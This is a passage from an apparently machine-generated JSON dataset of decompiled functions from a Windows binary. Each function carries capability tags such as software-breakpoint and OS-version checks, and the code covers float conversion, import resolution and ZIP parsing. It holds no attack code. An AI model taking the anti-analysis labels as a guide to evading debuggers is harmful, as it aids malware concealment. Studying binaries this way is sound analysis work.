while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0043c981:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4579e4 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4579e4 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.0042ad2a(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3259
    },
    "0043c9ce": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0043c9ce(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4579f8;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4579f4 + -1;\n        iVar14 = *0x4579f4 + (*0x4579f4 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x4579f4 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0043cb12;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0043cb19;\ncode_r0x0043cb12:\n                        do {\n                            bVar6 = true;\ncode_r0x0043cb19:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0043cb27;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0043cb27:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4579f0 - *0x4579f4) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4579f0 < iVar14) {\n                if (iVar14 < *0x4579ec) {\n                    iVar14 = iVar14 + *0x457a00;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4579f8 + (*0x4579f8 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4579f8 + (*0x4579f8 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x457a00 + *0x4579ec;\n                }\n                goto code_r0x0043ced2;\n            }\n            iVar13 = *0x4579f0 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4579f4 + -1;\n            iVar13 = *0x4579f4 + (*0x4579f4 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4579f4 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0043ccc6;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0043ccc6:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4579f8 + 1 + (*0x4579f8 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0043ced2:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4579fc == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4579fc == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.0042ad2a(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3250
    },
    "00405500": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00405500(void)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    int32_t unaff_EDI;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(unaff_EDI + 0xc0) == 0) || (*(unaff_EDI + 0xc4) == 0)) {\n        return 0;\n    }\n    piVar5 = *(unaff_EDI + 0x144) + *(unaff_EDI + 0xc0);\n    iVar2 = piVar5[3];\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    do {\n        iVar2 = (**0x440020)(*(unaff_EDI + 0x144) + iVar2);\n        if (iVar2 == 0) {\n            return 6;\n        }\n        uVar4 = *(unaff_EDI + 0x154);\n        if (uVar4 <= *(unaff_EDI + 0x150)) {\n            if (uVar4 == 0) {\n                iVar3 = 0x10;\n            }\n            else {\n                iVar3 = uVar4 * 2;\n            }\n            *(unaff_EDI + 0x154) = iVar3;\n            var_ch = fcn.0042ae6b(iVar3 * 4);\n            if (var_ch == 0) {\n                return 3;\n            }\n            if (*(unaff_EDI + 0x150) != 0) {\n                fcn.0042af40(var_ch, *(unaff_EDI + 0x14c), *(unaff_EDI + 0x150) * 4);\n            }\n            fcn.0042aeff(*(unaff_EDI + 0x14c));\n            *(unaff_EDI + 0x14c) = var_ch;\n        }\n        *(var_ch + *(unaff_EDI + 0x150) * 4) = iVar2;\n        *(unaff_EDI + 0x150) = *(unaff_EDI + 0x150) + 1;\n        puVar7 = piVar5[4] + *(unaff_EDI + 0x144);\n        puVar6 = puVar7;\n        if (piVar5[1] != 0) {\n            if (*piVar5 == 0) {\n                return 8;\n            }\n            puVar6 = *piVar5 + *(unaff_EDI + 0x144);\n        }\n        uVar4 = *puVar6;\n        while (uVar4 != 0) {\n            if (uVar4 < 0) {\n                uVar4 = uVar4 & 0xffff;\n            }\n            else {\n                uVar4 = uVar4 + 2 + *(unaff_EDI + 0x144);\n            }\n            uVar4 = (**0x44001c)(iVar2, uVar4);\n            *puVar7 = uVar4;\n            if (uVar4 == 0) {\n                return 6;\n            }\n            puVar1 = puVar6 + 1;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n            uVar4 = *puVar1;\n        }\n        iVar2 = piVar5[8];\n        piVar5 = piVar5 + 5;\n        if (iVar2 == 0) {\n            return iVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 821
    },
    "00405d10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00405d10(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint32_t arg_10h;\n    \n    if (arg_8h == 0xffffffff) {\n        fcn.0042a14e(0x4453fc);\n    }\n    uVar1 = in_ECX[5];\n    if (uVar1 < arg_8h) {\n        fcn.00405b70(arg_8h, in_ECX[4]);\n        return arg_8h != 0;\n    }\n    if ((arg_ch != '\\0') && (arg_8h < 0x10)) {\n        arg_10h = in_ECX[4];\n        if (arg_8h < in_ECX[4]) {\n            arg_10h = arg_8h;\n        }\n        if (0xf < uVar1) {\n            arg_ch_00 = *in_ECX;\n            if (arg_10h != 0) {\n                fcn.0042af40(in_ECX, arg_ch_00, arg_10h);\n            }\n            fcn.0042ac49(arg_ch_00);\n        }\n        in_ECX[4] = arg_10h;\n        in_ECX[5] = 0xf;\n        *(arg_10h + in_ECX) = 0;\n        return arg_8h != 0;\n    }\n    if (arg_8h == 0) {\n        in_ECX[4] = 0;\n        if (0xf < uVar1) {\n            in_ECX = *in_ECX;\n        }\n        *in_ECX = 0;\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 397
    },
    "00406d90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406d90(uint arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_2ch;\n    int32_t iVar1;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_2ch = (**(arg_18h + 0x20))(*(arg_18h + 0x28), 0x13, 4);\n    if (arg_2ch == 0) {\n        return -4;\n    }\n    iVar1 = fcn.00406850(arg_8h, 0x13, 0x13, 0, 0, arg_10h, arg_ch, arg_14h, &var_4h, arg_2ch);\n    if (iVar1 == -3) {\n        *(arg_18h + 0x18) = 0x446c2c;\n    }\n    else if ((iVar1 == -5) || (*arg_ch == 0)) {\n        *(arg_18h + 0x18) = 0x446c08;\n        iVar1 = -3;\n    }\n    (**(arg_18h + 0x24))(*(arg_18h + 0x28), arg_2ch);\n    return iVar1;\n}\n",
        "token_count": 307
    },
    "00407690": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407690(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    \n    if (((arg_8h != 0) && (*(arg_8h + 0x1c) != 0)) && (*(arg_8h + 0x24) != 0)) {\n        arg_8h_00 = *(*(arg_8h + 0x1c) + 0x14);\n        if (arg_8h_00 != 0) {\n            fcn.004067b0(arg_8h_00, arg_8h);\n        }\n        (**(arg_8h + 0x24))(*(arg_8h + 0x28), *(arg_8h + 0x1c));\n        *(arg_8h + 0x1c) = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 207
    },
    "004078b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004078b0(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, char *arg_14h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint32_t arg_10h_00;\n    \n    pcVar3 = arg_14h;\n    uVar2 = arg_ch;\n    arg_10h_00 = arg_ch * arg_10h;\n    if (*arg_14h != '\\0') {\n        iVar4 = (**0x469214)(*(arg_14h + 4), arg_8h, arg_10h_00, &arg_ch, 0);\n        if (iVar4 == 0) {\n            pcVar3[8] = '\\x01';\n        }\n        return arg_ch / uVar2;\n    }\n    iVar4 = *(arg_14h + 0x1c);\n    if (*(arg_14h + 0x18) < iVar4 + arg_10h_00) {\n        arg_10h_00 = *(arg_14h + 0x18) - iVar4;\n    }\n    fcn.0042af40(arg_8h, *(arg_14h + 0x14) + iVar4, arg_10h_00);\n    piVar1 = pcVar3 + 0x1c;\n    *piVar1 = *piVar1 + arg_10h_00;\n    return arg_10h_00 / uVar2;\n}\n",
        "token_count": 351
    },
    "00407930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00407930(char *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.004078b0(&var_1h, 1, 1, arg_8h);\n    if (iVar1 == 1) {\n        var_8h = var_1h;\ncode_r0x0040796e:\n        iVar1 = 0;\n    }\n    else {\n        if ((*arg_8h == '\\0') || (arg_8h[8] == '\\0')) goto code_r0x0040796e;\n        iVar1 = -1;\n    }\n    if (iVar1 != 0) {\ncode_r0x004079b1:\n        *arg_ch = 0;\n        return iVar1;\n    }\n    iVar1 = fcn.004078b0(&var_1h, 1, 1, arg_8h);\n    if (iVar1 == 1) {\n        uVar2 = var_1h;\n    }\n    else {\n        uVar2 = var_8h;\n        if ((*arg_8h != '\\0') && (arg_8h[8] != '\\0')) {\n            iVar1 = -1;\n            goto code_r0x004079b1;\n        }\n    }\n    *arg_ch = uVar2 * 0x100 + var_8h;\n    return 0;\n}\n",
        "token_count": 367
    },
    "004079d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004079d0(char *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.004078b0(&var_1h, 1, 1, arg_8h);\n    if (iVar1 == 1) {\n        var_8h = var_1h;\ncode_r0x00407a0e:\n        iVar1 = 0;\n    }\n    else {\n        if ((*arg_8h == '\\0') || (arg_8h[8] == '\\0')) goto code_r0x00407a0e;\n        iVar1 = -1;\n    }\n    uVar4 = var_8h;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004078b0(&var_1h, 1, 1, arg_8h);\n        if (iVar1 == 1) {\n            uVar4 = var_1h;\n        }\n        else if ((*arg_8h != '\\0') && (arg_8h[8] != '\\0')) {\n            iVar1 = -1;\n            goto code_r0x00407a32;\n        }\n        iVar1 = 0;\n    }\ncode_r0x00407a32:\n    iVar3 = uVar4 * 0x100;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004078b0(&var_1h, 1, 1, arg_8h);\n        if (iVar1 == 1) {\n            uVar4 = var_1h;\n        }\n        else if ((*arg_8h != '\\0') && (arg_8h[8] != '\\0')) {\n            iVar1 = -1;\n            goto code_r0x00407a59;\n        }\n        iVar1 = 0;\n    }\ncode_r0x00407a59:\n    iVar2 = uVar4 * 0x10000;\n    if (iVar1 != 0) {\ncode_r0x00407abf:\n        *arg_ch = 0;\n        return iVar1;\n    }\n    iVar1 = fcn.004078b0(&var_1h, 1, 1, arg_8h);\n    if (iVar1 == 1) {\n        uVar4 = var_1h;\n    }\n    else if ((*arg_8h != '\\0') && (arg_8h[8] != '\\0')) {\n        iVar1 = -1;\n        goto code_r0x00407abf;\n    }\n    *arg_ch = uVar4 * 0x1000000 + var_8h + iVar3 + iVar2;\n    return 0;\n}\n",
        "token_count": 663
    },
    "00407b30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407b30(char *arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar2 = arg_8h;\n    if (*arg_8h == '\\0') {\n        *(arg_8h + 0x1c) = *(arg_8h + 0x18);\n    }\n    else {\n        if (arg_8h[1] == '\\0') {\n            return -1;\n        }\n        (**0x469108)(*(arg_8h + 4), 0, 0, 2);\n    }\n    if (*arg_8h == '\\0') {\n        arg_8h = *(arg_8h + 0x1c);\n    }\n    else if (arg_8h[1] == '\\0') {\n        arg_8h = NULL;\n    }\n    else {\n        iVar3 = (**0x469108)(*(arg_8h + 4), 0, 0, 1);\n        arg_8h = iVar3 - *(arg_8h + 0xc);\n    }\n    var_4h = 0xffff;\n    if (arg_8h < 0xffff) {\n        var_4h = arg_8h;\n    }\n    uVar6 = var_4h;\n    var_ch = fcn.0042ae6b(0x404);\n    if (var_ch == 0) {\n        return -1;\n    }\n    var_10h = -1;\n    uVar5 = 4;\n    if (uVar6 < 5) {\ncode_r0x00407cdd:\n        fcn.0042aeff(var_ch);\n        return var_10h;\n    }\n    do {\n        var_8h = uVar6;\n        if (uVar5 + 0x400 <= uVar6) {\n            var_8h = uVar5 + 0x400;\n        }\n        iVar3 = arg_8h - var_8h;\n        uVar6 = arg_8h - iVar3;\n        if (0x404 < uVar6) {\n            uVar6 = 0x404;\n        }\n        if (*pcVar2 == '\\0') {\n            *(pcVar2 + 0x1c) = iVar3;\n        }\n        else {\n            if (pcVar2[1] == '\\0') goto code_r0x00407cdd;\n            (**0x469108)(*(pcVar2 + 4), *(pcVar2 + 0xc) + iVar3, 0, 0);\n        }\n        if (*pcVar2 == '\\0') {\n            iVar4 = *(pcVar2 + 0x1c);\n            uVar5 = uVar6;\n            if (*(pcVar2 + 0x18) < iVar4 + uVar6) {\n                uVar5 = *(pcVar2 + 0x18) - iVar4;\n            }\n            fcn.0042af40(var_ch, *(pcVar2 + 0x14) + iVar4, uVar5);\n            *(pcVar2 + 0x1c) = *(pcVar2 + 0x1c) + uVar5;\n        }\n        else {\n            iVar4 = (**0x469214)(*(pcVar2 + 4), var_ch, uVar6, &var_14h, 0);\n            uVar5 = var_14h;\n            if (iVar4 == 0) {\n                pcVar2[8] = '\\x01';\n            }\n        }\n        if (uVar5 / uVar6 != 1) goto code_r0x00407cdd;\n        iVar4 = uVar6 - 3;\n        do {\n            iVar1 = iVar4;\n            if (iVar1 < 0) goto code_r0x00407ccb;\n            iVar4 = iVar1 + -1;\n        } while ((((*(iVar4 + var_ch) != 'P') || (*(iVar1 + var_ch) != 'K')) || (*(iVar1 + 1 + var_ch) != '\\x05')) ||\n                (*(iVar1 + 2 + var_ch) != '\\x06'));\n        var_10h = iVar4 + iVar3;\ncode_r0x00407ccb:\n        if ((var_10h != 0) || (uVar5 = var_8h,  uVar6 = var_4h,  var_4h <= var_8h)) goto code_r0x00407cdd;\n    } while( true );\n}\n",
        "token_count": 1076
    },
    "00407d00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00407d00(char **arg_8h, uint *arg_ch, uint *arg_10h, int32_t arg_14h, uint32_t arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t arg_28h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t arg_ch_00;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = 0;\n    if (arg_8h == NULL) {\n        return -0x66;\n    }\n    pcVar1 = *arg_8h;\n    if (*pcVar1 == '\\0') {\n        *(pcVar1 + 0x1c) = arg_8h[5] + arg_8h[3];\ncode_r0x00407d44:\n        iVar2 = fcn.004079d0(*arg_8h, &var_4h);\n        if (iVar2 != 0) goto code_r0x00407d57;\n        if (var_4h != 0x2014b50) {\n            iVar3 = -0x67;\n        }\n    }\n    else {\n        if (pcVar1[1] != '\\0') {\n            (**0x469108)(*(pcVar1 + 4), arg_8h[5] + arg_8h[3] + *(pcVar1 + 0xc), 0, 0);\n            goto code_r0x00407d44;\n        }\ncode_r0x00407d57:\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_58h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_54h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_50h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_4ch);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004079d0(*arg_8h, &var_48h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    var_14h = var_48h >> 0x10 & 0x1f;\n    var_ch = (var_48h >> 0x19) + 0x7bc;\n    var_10h = (var_48h >> 0x15 & 0xf) - 1;\n    var_18h = var_48h >> 0xb & 0x1f;\n    var_20h = (var_48h & 0x1f) * 2;\n    var_1ch = var_48h >> 5 & 0x3f;\n    iVar2 = fcn.004079d0(*arg_8h, &var_44h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004079d0(*arg_8h, &var_40h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004079d0(*arg_8h, &var_3ch);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_38h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_34h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_30h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_2ch);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00407930(*arg_8h, &var_28h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004079d0(*arg_8h, &var_24h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004079d0(*arg_8h, &var_8h);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    if (iVar3 == 0) {\n        if (arg_14h != 0) {\n            arg_ch_00 = arg_18h;\n            if (var_38h < arg_18h) {\n                *(var_38h + arg_14h) = 0;\n                arg_ch_00 = var_38h;\n            }\n            if (((var_38h != 0) && (arg_18h != 0)) &&\n               (iVar2 = fcn.004078b0(arg_14h, 